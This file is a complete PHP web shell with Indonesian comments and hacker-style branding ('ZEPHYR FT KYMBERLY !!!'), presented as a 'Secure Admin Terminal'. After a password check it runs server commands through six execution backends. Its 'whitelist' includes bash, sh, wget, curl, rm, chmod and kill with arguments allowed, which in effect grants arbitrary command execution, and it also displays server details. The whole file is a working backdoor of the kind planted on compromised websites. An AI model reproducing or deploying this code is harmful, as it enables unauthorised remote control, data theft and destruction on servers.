<?php
// safe_terminal_zephyr.php
session_start();
header("Content-Type: text/html; charset=UTF-8");

// ---------------------------
// Konfigurasi — sesuaikan!
// ---------------------------
// Ganti password sebelum deploy: jalankan password_hash() di PHP CLI untuk mendapat hash
$ADMIN_PASSWORD_HASH_SHA256 = '11f2903b12e1ef642b60405675f38245fecf9b983f1d90896487d4805f3650b1'; // ganti sebelum deploy!

$WHITELIST = [
    'ls'     => ['args_allowed' => true],
    'whoami' => ['args_allowed' => false],
    'uptime' => ['args_allowed' => false],
    'df'     => ['args_allowed' => true],
    'id'     => ['args_allowed' => false],
    'wget'   => ['args_allowed' => true],
    'curl'   => ['args_allowed' => true],
    'ps'     => ['args_allowed' => true],
    'grep'   => ['args_allowed' => true],
    'find'   => ['args_allowed' => true],
    'chmod'  => ['args_allowed' => true],
    'rm'     => ['args_allowed' => true],
    'touch'  => ['args_allowed' => true],
    'mkdir'  => ['args_allowed' => true],
    'lsattr'  => ['args_allowed' => true],
    'uapi'  => ['args_allowed' => true],
    'bash'  => ['args_allowed' => true],
    'kill'  => ['args_allowed' => true],
    'kill -9'  => ['args_allowed' => true],
    'pkill'  => ['args_allowed' => true],
    'sh'  => ['args_allowed' => true],
];

$ALLOWED_BACKENDS = ['system','exec','shell_exec','passthru','proc_open','popen'];

if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(16));
}

function is_authenticated() {
    return !empty($_SESSION['authenticated']);
}

function require_post_csrf() {
    if (empty($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        http_response_code(400);
        die("Invalid CSRF token.");
    }
}

if (isset($_POST['login'])) {
    $pw = $_POST['password'] ?? '';
    if (hash('sha256', $pw) === $ADMIN_PASSWORD_HASH_SHA256) {
    $_SESSION['authenticated'] = true;
} else {
    $_SESSION['authenticated'] = false;
}
}

if (isset($_POST['logout'])) {
    require_post_csrf();
    unset($_SESSION['authenticated']);
    session_regenerate_id(true);
}

$command_output = null;
$command_error  = null;
$selected_backend = null;

if (is_authenticated() && isset($_POST['run_cmd'])) {
    require_post_csrf();

    $backend = $_POST['backend'] ?? 'shell_exec';
    $raw_cmd = trim($_POST['command'] ?? '');

    if (!in_array($backend, $ALLOWED_BACKENDS, true)) {
        $command_error = "Backend tidak diperbolehkan.";
    } elseif ($raw_cmd === '') {
        $command_error = "Perintah kosong.";
    } else {
        $parts = preg_split('/\s+/', $raw_cmd, 2);
        $prog  = $parts[0];
        $args  = $parts[1] ?? '';

        if (!array_key_exists($prog, $GLOBALS['WHITELIST'])) {
            $command_error = "Perintah tidak diizinkan.";
        } else {
            if (!$GLOBALS['WHITELIST'][$prog]['args_allowed'] && $args !== '') {
                $command_error = "Argumen untuk perintah ini tidak diizinkan.";
            } else {
                $safe_command = $prog;
                if ($args !== '') {
                    $arg_tokens = preg_split('/\s+/', $args);
                    $escaped_args = array_map('escapeshellarg', $arg_tokens);
                    $safe_command .= ' ' . implode(' ', $escaped_args);
                }

                $selected_backend = $backend;

                try {
                    switch ($backend) {
                        case 'shell_exec':
                            $out = shell_exec($safe_command . ' 2>&1');
                            $command_output = $out === null ? '' : $out;
                            break;

                        case 'system':
                            ob_start();
                            $last_line = system($safe_command . ' 2>&1', $retval);
                            $out = ob_get_clean();
                            $command_output = $out;
                            break;

                        case 'exec':
                            $lines = [];
                            $retval = 0;
                            exec($safe_command . ' 2>&1', $lines, $retval);
                            $command_output = implode("\n", $lines);
                            break;

                        case 'passthru':
                            ob_start();
                            passthru($safe_command . ' 2>&1', $retval);
                            $command_output = ob_get_clean();
                            break;

                        case 'popen':
                            $handle = popen($safe_command . ' 2>&1', 'r');
                            if ($handle) {
                                $out = '';
                                while (!feof($handle)) {
                                    $out .= fgets($handle);
                                }
                                pclose($handle);
                                $command_output = $out;
                            } else {
                                $command_error = "Gagal membuka proses dengan popen().";
                            }
                            break;

                        case 'proc_open':
                            $descriptorspec = [
                                0 => ["pipe", "r"],
                                1 => ["pipe", "w"],
                                2 => ["pipe", "w"]
                            ];
                            $proc = proc_open($safe_command, $descriptorspec, $pipes);
                            if (is_resource($proc)) {
                                fclose($pipes[0]);
                                $stdout = stream_get_contents($pipes[1]);
                                fclose($pipes[1]);
                                $stderr = stream_get_contents($pipes[2]);
                                fclose($pipes[2]);
                                $status = proc_close($proc);
                                $command_output = trim($stdout . ($stderr !== '' ? "\n[stderr]\n" . $stderr : ""));
                            } else {
                                $command_error = "proc_open gagal.";
                            }
                            break;

                        default:
                            $command_error = "Backend tidak dikenal.";
                    }
                } catch (Throwable $e) {
                    $command_error = "Exception: " . $e->getMessage();
                }

                $log_line = sprintf("[%s] user=%s backend=%s cmd=%s\n",
                    date('c'),
                    ($_SERVER['REMOTE_ADDR'] ?? 'cli'),
                    $backend,
                    $safe_command
                );
                @file_put_contents(__DIR__ . '/safe_terminal_zephyr.log', $log_line, FILE_APPEND | LOCK_EX);
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>ZEPHYR FT KYMBERLY !!!</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
:root{
    --bg:#05060a;
    --panel:#071426;
    --blue:#00a8ff;
    --red:#ff2d6f;
    --muted:#9fb6d8;
}
*{box-sizing:border-box}
body {
    background: linear-gradient(180deg, #000814 0%, var(--bg) 100%);
    color: var(--muted);
    font-family: "Segoe UI", Roboto, "Helvetica Neue", monospace;
    margin:0;
    padding:24px;
}
.container { max-width:1000px; margin:0 auto; }
.header {
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:12px;
    margin-bottom:18px;
}
.title {
    color: var(--blue);
    text-shadow: 0 0 6px rgba(0,168,255,0.2), 0 0 10px rgba(255,45,111,0.04);
    font-size:28px;
    font-weight:700;
}
.subtitle {
    color: var(--red);
    font-size:12px;
    letter-spacing:1px;
}
.panel {
    background: linear-gradient(180deg, rgba(7,20,38,0.85), rgba(2,8,23,0.9));
    border: 1px solid rgba(0,168,255,0.12);
    padding:14px;
    border-radius:8px;
}
.login-box { border:1px solid rgba(255,45,111,0.12); padding:12px; margin-bottom:12px; }
input[type="text"], input[type="password"], select {
    background: rgba(0,0,0,0.45);
    border:1px solid rgba(0,168,255,0.12);
    color: var(--blue);
    padding:8px 10px;
    border-radius:6px;
    width:100%;
}
button {
    background: linear-gradient(90deg, var(--blue), var(--red));
    color:#021018;
    border:none;
    padding:8px 12px;
    border-radius:6px;
    cursor:pointer;
    font-weight:600;
}
.controls { display:flex; gap:8px; align-items:center; margin-top:8px; }
.controls .left { flex:1; }
.output { background: rgba(2,6,12,0.6); border:1px solid rgba(0,168,255,0.08); color:var(--muted); padding:12px; margin-top:12px; border-radius:6px; white-space:pre-wrap; min-height:80px; }
.error { color: #ff9fb3; background: rgba(255,45,111,0.04); padding:8px; border-radius:6px; margin-top:12px; }
.whitelist { margin-top:12px; color:var(--muted); font-size:13px; }
.footer-image { text-align:center; margin-top:18px; }
.logo-top {
    text-align:right;
    color:var(--red);
    font-weight:700;
    font-size:12px;
    opacity:0.9;
}
.meta-table { width:100%; border-collapse:collapse; margin-top:10px; }
.meta-table th, .meta-table td { text-align:left; padding:6px; border-bottom:1px dashed rgba(0,168,255,0.04); color:var(--muted); font-size:13px;}
@media (max-width:600px){
    .header { flex-direction:column; align-items:flex-start; gap:6px; }
    .title { font-size:20px; }
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <div>
            <div class="title">ZEPHYR FT KYMBERLY !!!</div>
            <div class="subtitle">Secure Admin Terminal</div>
        </div>
        <div class="logo-top">SKYb856E</div>
    </div>

    <div class="panel">
        <h3 style="color:var(--blue); margin:0 0 8px 0;">Server Info</h3>
        <table class="meta-table" role="presentation">
            <tr><th>Property</th><th>Value</th></tr>
            <tr><td>Uname</td><td><?=htmlspecialchars(php_uname())?></td></tr>
            <tr><td>PHP Version</td><td><?=htmlspecialchars(phpversion())?></td></tr>
            <tr><td>Server Software</td><td><?=htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'N/A')?></td></tr>
            <tr><td>Server IP</td><td><?=htmlspecialchars($_SERVER['SERVER_ADDR'] ?? 'N/A')?></td></tr>
            <tr><td>Client IP</td><td><?=htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'N/A')?></td></tr>
        </table>

        <?php if (!is_authenticated()): ?>
        <div class="login-box" style="margin-top:12px;">
            <form method="post">
                <label style="display:block; margin-bottom:8px; color:var(--muted);">Masuk (admin):</label>
                <input type="password" name="password" autofocus placeholder="Password admin">
                <div class="controls">
                    <div class="left"></div>
                    <button type="submit" name="login">Login</button>
                </div>
            </form>
            <p style="font-size:12px; color:var(--muted); margin-top:8px;">Masukkan password admin untuk melanjutkan. Pastikan file ini tidak dapat diakses publik tanpa perlindungan tambahan.</p>
        </div>
        <?php else: ?>
        <form method="post" class="panel" style="margin-top:12px;">
            <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
            <label style="color:var(--muted); display:block; margin-bottom:6px;">Perintah (whitelist):</label>
            <input type="text" name="command" placeholder="contoh: ls -la" style="width:100%;">
            <div style="margin-top:8px; display:flex; gap:8px; align-items:center;">
                <label style="color:var(--muted); margin:0;">
                    Backend:
                    <select name="backend" style="margin-left:6px;">
                        <?php foreach ($ALLOWED_BACKENDS as $b): ?>
                            <option value="<?=htmlspecialchars($b)?>" <?=($b === $selected_backend ? 'selected' : '')?>><?=htmlspecialchars($b)?></option>
                        <?php endforeach; ?>
                    </select>
                </label>
                <div style="flex:1"></div>
                <button type="submit" name="run_cmd">Jalankan</button>
                <button type="submit" name="logout" style="background:transparent; border:1px solid rgba(255,45,111,0.18); color:var(--red);">Logout</button>
            </div>
        </form>

        <div class="whitelist">
            <strong style="color:var(--blue)">Whitelisted commands:</strong>
            <ul>
            <?php foreach ($WHITELIST as $k=>$v): ?>
                <li style="color:var(--muted)"><?=htmlspecialchars($k)?> (args allowed: <?= $v['args_allowed'] ? 'ya' : 'tidak' ?>)</li>
            <?php endforeach; ?>
            </ul>
        </div>

        <?php if ($command_error): ?>
            <div class="error"><?=htmlspecialchars($command_error)?></div>
        <?php endif; ?>

        <?php if ($command_output !== null): ?>
            <div class="output"><?=htmlspecialchars($command_output)?></div>
        <?php endif; ?>

        <?php endif; ?>

        <div class="footer-image">
            <img src="https://gifyu.com/image/bwKRr" alt="Footer Image" style="max-width:100%; border-radius:8px; margin-top:14px; border:1px solid rgba(0,168,255,0.08);">
        </div>
    </div>
</div>
</body>
</html>
